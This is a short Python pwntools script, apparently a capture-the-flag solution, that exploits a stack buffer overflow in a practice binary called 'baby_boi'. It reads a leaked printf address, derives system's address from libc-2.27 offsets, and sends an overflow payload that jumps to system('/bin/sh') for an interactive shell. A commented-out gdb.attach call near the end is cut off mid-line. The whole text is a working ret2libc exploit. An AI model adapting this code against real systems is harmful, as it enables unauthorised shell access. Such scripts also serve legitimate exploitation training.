#coding=utf-8
from pwn import *

elf = ELF('libc-2.27.so')

stack = 0x7fffffffe3b0
ret = 0x7fffffffe3d8 

sh = 0x7ffff7b97e9a

d_printf_system = elf.symbols.printf - elf.symbols.system

r = process('./baby_boi')
pointer = r.recv(1000).split('\n')[1][-14:].strip()
log.info(pointer)
r.send('a' * (ret - stack) + p64(int(pointer[2:], 16) - d_printf_system) + 'aaaaaaaa' + p64(sh))
#gdb.attach(
r.interactive()
